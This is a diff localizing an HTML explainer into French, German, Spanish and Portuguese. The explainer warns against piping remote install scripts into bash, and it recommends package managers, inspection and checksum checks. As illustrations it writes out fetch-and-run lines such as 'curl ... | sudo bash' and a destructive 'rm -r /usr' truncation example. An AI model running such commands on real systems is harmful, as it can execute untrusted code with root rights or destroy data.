+          <div class="example-body">T&#233;l&#233;charge depuis un CDN interne propri&#233;taire sans historique de sources public et sans somme de contr&#244;le. Il n&#8217;y a rien &#224; auditer et aucun moyen de v&#233;rifier ce que vous avez re&#231;u.</div>
         </div>
         </div>
       </section>
@@ -868,8 +868,8 @@
         <h2>Faites plutôt ça</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Utiliser un vrai gestionnaire de paquets</h3>
+          <p>L&#8217;option ennuyeuse est g&#233;n&#233;ralement la bonne. Les gestionnaires de paquets g&#232;rent l&#8217;int&#233;grit&#233;, les mises &#224; jour et la d&#233;sinstallation.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -880,8 +880,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. T&#233;l&#233;charger, inspecter, puis ex&#233;cuter</h3>
+          <p>Une &#233;tape suppl&#233;mentaire. Vous donne l&#8217;occasion de lire le script et conserve une copie locale pour r&#233;f&#233;rence ult&#233;rieure.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -889,19 +889,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Journaliser tout ce qui s&#8217;ex&#233;cute</h3>
+          <p>Si vous devez utiliser un tube &#8212; enregistrez ce qui s&#8217;est ex&#233;cut&#233; afin de pouvoir auditer ou annuler plus tard.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Attention</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> ne trace que les commandes de premier niveau. Les sous-processus et les scripts source&#233;s n&#8217;appara&#238;tront pas dans le journal.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. V&#233;rifier la somme de contr&#244;le</h3>
+          <p>Si le projet publie un hachage SHA-256, utilisez-le. Non n&#233;gociable sur les machines de production.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -913,10 +913,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Objection courante</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#171;Mais je fais confiance au fournisseur, donc c&#8217;est bon, non&#8239;?&#187;</p>
+          <p class="faq-a">Faire confiance au fournisseur est n&#233;cessaire mais pas suffisant. `curl | bash` ajoute une surface d&#8217;attaque par-dessus cette confiance: vous faites &#233;galement confiance au DNS, au CDN, &#224; l&#8217;h&#233;bergeur, et &#224; quiconque pourrait compromettre l&#8217;URL entre maintenant et le moment o&#249; vous l&#8217;ex&#233;cutez. Un paquet install&#233; via un gestionnaire de paquets passe par des couches de v&#233;rification suppl&#233;mentaires. La r&#233;putation du fournisseur ne rend pas le m&#233;canisme de livraison s&#251;r.</p>
         </div>
       </section>
 
@@ -950,43 +950,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash startet, bevor der Download abgeschlossen ist</strong>
+            <p>Die Pipe ist live. Bash empf&#228;ngt und f&#252;hrt Zeilen aus, sobald sie ankommen. Wird die Verbindung mitten im Transfer getrennt, kommt es zu partieller Ausf&#252;hrung: ein Befehl wie <code>rm -r /usr/share/program</code> kann zu <code>rm -r /usr</code> abgeschnitten werden. Befehle wurden ausgef&#252;hrt, die Bereinigung nicht.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Der Server wei&#223;, dass Sie eine Pipe verwenden &#8212; und kann l&#252;gen</strong>
+            <p>Server erkennen den curl User-Agent oder nutzen Timing: ein <code>sleep</code>-Befehl wird fr&#252;h im Skript gesendet &#8212; wenn bash ihn ausf&#252;hrt, pausieren Pipe-Lesevorg&#228;nge, curl blockiert, und der Server beobachtet die Verz&#246;gerung. Ausf&#252;hrung best&#228;tigt. Dann wird ein anderer Payload geliefert. &#8222;Ich lese es zuerst im Browser&#8220; sch&#252;tzt Sie nicht: was Sie lesen, ist nicht das, was ausgef&#252;hrt wurde.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Keine Integrit&#228;tspr&#252;fung</strong>
+            <p>Keine Pr&#252;fsumme, keine Signatur. Sie vertrauen gleichzeitig DNS, TLS, dem CDN und dem Ursprungsserver. Ein kompromittiertes CDN oder ein BGP-Hijack liefert lautlos Schadsoftware.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Sie vertrauen mehr als Sie denken</strong>
+            <p>Nicht nur dem Autor. Sie vertrauen dem Domain-Registrar, dem DNS-Anbieter, dem CDN, dem Hosting, jeder CI/CD-Pipeline, die das Artefakt gebaut hat, und jedem zuk&#252;nftigen Maintainer, der jemals in dieses Repository pushen wird.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Sie k&#246;nnen nicht reproduzieren, was ausgef&#252;hrt wurde</strong>
+            <p>Die URL ist live und ver&#228;nderlich. Es gibt keine Aufzeichnung dar&#252;ber, was genau auf Ihrem System ausgef&#252;hrt wurde &#8212; nur dass irgendetwas ausgef&#252;hrt wurde.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong><code>sudo</code> hinzuf&#252;gen und das Spiel ist aus</strong>
+            <p><code>curl ... | sudo bash</code> gew&#228;hrt Root-Rechte an jeden, der diese URL in diesem Moment kontrolliert. Dieses Muster taucht in real ver&#246;ffentlichten Dokumentationen auf. H&#228;ufig.</p>
           </div>
         </li>
         </ul>
@@ -1000,33 +1000,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">Entwicklungsumgebungs-Manager</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">L&#228;dt eine Bin&#228;rdatei nach <strong>/usr/local/bin via sudo</strong> ohne Integrit&#228;tspr&#252;fung herunter. War eine erforderliche Abh&#228;ngigkeit nicht vorhanden, zog das Skript still Gigabytes zus&#228;tzlicher Werkzeuge nach. Folgte au&#223;erdem einer nicht offengelegten Weiterleitungskette zwischen Domains.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">Cloud-Entwicklungswerkzeug</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">Die Installations-URL leitete still auf einen <strong>live Dev-Branch auf GitHub</strong> um &#8212; keine Versions-Tags, kein Pinning. Jeder Commit auf diesen Branch ver&#228;nderte, was Nutzer erhielten. Was gestern ausgef&#252;hrt wurde, ist nicht das, was heute ausgef&#252;hrt wird.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">quelloffener KI-Agent</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">L&#228;dt eine Python-Laufzeitumgebung, eine JavaScript-Laufzeitumgebung und einen vollst&#228;ndigen Headless-Browser herunter (~300&#8239;MB). Kann sudo aufrufen, um Systempakete zu installieren. Nach dem Entfernen des Hauptverzeichnisses verbleiben Spuren auf Systemebene.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">Code-Assistent eines gro&#223;en Hardware-Herstellers</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">L&#228;dt von einem propriet&#228;ren internen CDN ohne &#246;ffentlichen Quellverlauf und ohne Pr&#252;fsumme herunter. Es gibt nichts zu pr&#252;fen und keine M&#246;glichkeit zu verifizieren, was empfangen wurde.</div>
         </div>
         </div>
       </section>
@@ -1035,8 +1035,8 @@
         <h2>Besser so machen</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Einen echten Paketmanager verwenden</h3>
+          <p>Die langweilige Option ist meist die richtige. Paketmanager k&#252;mmern sich um Integrit&#228;t, Updates und Deinstallation.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -1047,8 +1047,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Herunterladen, pr&#252;fen, dann ausf&#252;hren</h3>
+          <p>Ein zus&#228;tzlicher Schritt. Gibt Ihnen die M&#246;glichkeit, das Skript zu lesen, und beh&#228;lt eine lokale Kopie f&#252;r sp&#228;tere Referenz.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -1056,19 +1056,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Alles protokollieren, was ausgef&#252;hrt wird</h3>
+          <p>Wenn Sie eine Pipe verwenden m&#252;ssen &#8212; zeichnen Sie auf, was ausgef&#252;hrt wurde, damit Sie sp&#228;ter pr&#252;fen oder r&#252;ckg&#228;ngig machen k&#246;nnen.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Hinweis</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> protokolliert nur Befehle der obersten Ebene. Unterprozesse und eingebundene Skripte erscheinen nicht im Protokoll.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Die Pr&#252;fsumme verifizieren</h3>
+          <p>Wenn das Projekt einen SHA-256-Hash ver&#246;ffentlicht, verwenden Sie ihn. Auf Produktivmaschinen nicht verhandelbar.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -1080,10 +1080,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>H&#228;ufiger Einwand</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#8222;Aber ich vertraue dem Anbieter, also ist es doch in Ordnung, oder?&#8220;</p>
+          <p class="faq-a">Dem Anbieter zu vertrauen ist notwendig, aber nicht hinreichend. `curl | bash` f&#252;gt zus&#228;tzliche Angriffsfl&#228;che auf dieses Vertrauen auf: Sie vertrauen au&#223;erdem DNS, dem CDN, dem Hosting-Anbieter und jedem, der die URL zwischen jetzt und dem Moment Ihrer Ausf&#252;hrung kompromittieren k&#246;nnte. Ein &#252;ber einen Paketmanager installiertes Paket durchl&#228;uft zus&#228;tzliche Verifizierungsschichten. Die Reputation des Anbieters macht den Liefermechanismus nicht sicher.</p>
         </div>
       </section>
 
@@ -1117,43 +1117,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash empieza antes de que termine la descarga</strong>
+            <p>La tuber&#237;a est&#225; activa. Bash recibe y ejecuta l&#237;neas seg&#250;n van llegando. Interrumpe la conexi&#243;n a mitad de la transferencia: un comando como <code>rm -r /usr/share/program</code> puede truncarse a <code>rm -r /usr</code>. Los comandos se ejecutaron, la limpieza no.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>El servidor sabe que est&#225;s usando una tuber&#237;a &#8212; y puede mentirte</strong>
+            <p>Los servidores detectan el User-Agent de curl o usan temporizaci&#243;n: env&#237;an un comando <code>sleep</code> al principio del script &#8212; si bash lo est&#225; ejecutando, la lectura de la tuber&#237;a se pausa, curl se bloquea y el servidor observa el retraso. Ejecuci&#243;n confirmada. Luego sirven una carga diferente. &#171;Primero lo leer&#233; en el navegador&#187; no te protege: lo que lees no es lo que se ejecut&#243;.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Sin verificaci&#243;n de integridad</strong>
+            <p>Sin suma de comprobaci&#243;n, sin firma. Conf&#237;as en DNS, TLS, el CDN y el origen simult&#225;neamente. Un CDN comprometido o un secuestro BGP entrega malware en silencio.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Conf&#237;as en m&#225;s de lo que crees</strong>
+            <p>No solo en el autor. Conf&#237;as en el registrador de dominio, el proveedor de DNS, el CDN, el alojamiento, cada pipeline de CI/CD que construy&#243; el artefacto, y cada futuro mantenedor que alguna vez haga push a ese repositorio.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>No puedes reproducir lo que se ejecut&#243;</strong>
+            <p>La URL est&#225; activa y es mutable. No existe ning&#250;n registro de qu&#233; se ejecut&#243; exactamente en tu m&#225;quina &#8212; solo que algo lo hizo.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>A&#241;ade <code>sudo</code> y todo est&#225; perdido</strong>
+            <p><code>curl ... | sudo bash</code> concede acceso root a quien controle esa URL en ese momento. Este patr&#243;n aparece en documentaci&#243;n real publicada. Con frecuencia.</p>
           </div>
         </li>
         </ul>
@@ -1167,33 +1167,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">gestor de entornos de desarrollo</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Descarg&#243; un binario en <strong>/usr/local/bin mediante sudo</strong> sin verificaci&#243;n de integridad. Si alguna dependencia requerida no estaba presente, el script descargaba silenciosamente gigabytes de herramientas adicionales. Tambi&#233;n segu&#237;a una cadena de redirecciones no revelada entre dominios.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">herramienta de codificaci&#243;n en la nube</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">La URL de instalaci&#243;n redirig&#237;a silenciosamente a una <strong>rama de desarrollo activa en GitHub</strong> &#8212; sin etiquetas de versi&#243;n, sin anclaje. Cada commit en esa rama cambiaba lo que rec&#237;b&#237;an los usuarios. Lo que se ejecut&#243; ayer no es lo que se ejecuta hoy.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">agente de IA de c&#243;digo abierto</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Descarg&#243; un entorno de ejecuci&#243;n de Python, uno de JavaScript y un navegador sin interfaz gr&#225;fica completo (~300&#8239;MB). Puede invocar sudo para instalar paquetes del sistema. Tras eliminar el directorio principal, permanecen rastros a nivel del sistema.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">asistente de c&#243;digo de un importante fabricante de hardware</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Descarga desde un CDN interno propietario sin historial de fuente p&#250;blica y sin suma de comprobaci&#243;n. No hay nada que auditar ni forma de verificar lo que recibiste.</div>
         </div>
         </div>
       </section>
@@ -1202,8 +1202,8 @@
         <h2>Haz esto en su lugar</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Usa un gestor de paquetes real</h3>
+          <p>La opci&#243;n aburrida suele ser la correcta. Los gestores de paquetes gestionan la integridad, las actualizaciones y la desinstalaci&#243;n.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -1214,8 +1214,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Descarga, inspecciona y luego ejecuta</h3>
+          <p>Un paso extra. Te da la oportunidad de leer el script y conserva una copia local para consultas futuras.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -1223,19 +1223,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Registra todo lo que se ejecuta</h3>
+          <p>Si tienes que usar una tuber&#237;a &#8212; registra lo que se ejecut&#243; para poder auditarlo o deshacerlo despu&#233;s.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Nota</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> registra solo los comandos de nivel superior. Los subprocesos y los scripts incluidos con source no aparecer&#225;n en el registro.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Verifica la suma de comprobaci&#243;n</h3>
+          <p>Si el proyecto publica un hash SHA-256, &#250;salo. Innegociable en m&#225;quinas de producci&#243;n.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -1247,10 +1247,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Objeci&#243;n habitual</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#171;Pero conf&#237;o en el proveedor, as&#237; que est&#225; bien, &#191;verdad?&#187;</p>
+          <p class="faq-a">Confiar en el proveedor es necesario pero no suficiente. `curl | bash` a&#241;ade superficie de ataque sobre esa confianza: tambi&#233;n conf&#237;as en DNS, el CDN, el proveedor de alojamiento y cualquiera que pueda comprometer la URL entre ahora y el momento en que la ejecutes. Un paquete instalado a trav&#233;s de un gestor de paquetes pasa por capas de verificaci&#243;n adicionales. Que el proveedor sea reputado no hace que el mecanismo de entrega sea seguro.</p>
         </div>
       </section>
 
@@ -1284,43 +1284,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>O Bash come&#231;a antes de a transfer&#234;ncia terminar</strong>
+            <p>O pipe est&#225; ativo. O Bash recebe e executa linhas conforme chegam. Interrompa a conex&#227;o no meio da transfer&#234;ncia: um comando como <code>rm -r /usr/share/program</code> pode ser truncado para <code>rm -r /usr</code>. Os comandos foram executados, a limpeza n&#227;o.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>O servidor sabe que voc&#234; est&#225; usando pipe &#8212; e pode mentir</strong>
+            <p>Os servidores detectam o User-Agent do curl ou usam temporiza&#231;&#227;o: enviam um comando <code>sleep</code> no in&#237;cio do script &#8212; se o bash o estiver executando, a leitura do pipe pausa, o curl bloqueia e o servidor observa o atraso. Execu&#231;&#227;o confirmada. Em seguida, servem um payload diferente. &#171;Vou ler no navegador primeiro&#187; n&#227;o te protege: o que voc&#234; l&#234; n&#227;o &#233; o que foi executado.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Sem verifica&#231;&#227;o de integridade</strong>
+            <p>Sem soma de verifica&#231;&#227;o, sem assinatura. Voc&#234; confia em DNS, TLS, no CDN e na origem simultaneamente. Um CDN comprometido ou um sequestro BGP entrega malware silenciosamente.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Voc&#234; confia em mais do que pensa</strong>
+            <p>N&#227;o apenas no autor. Voc&#234; confia no registrador de dom&#237;nio, no provedor de DNS, no CDN, no hospedeiro, em cada pipeline de CI/CD que construiu o artefato e em cada futuro mantenedor que venha a fazer push naquele reposit&#243;rio.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Voc&#234; n&#227;o consegue reproduzir o que foi executado</strong>
+            <p>A URL est&#225; ativa e &#233; mut&#225;vel. N&#227;o existe nenhum registro do que exatamente foi executado na sua m&#225;quina &#8212; apenas que algo foi.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
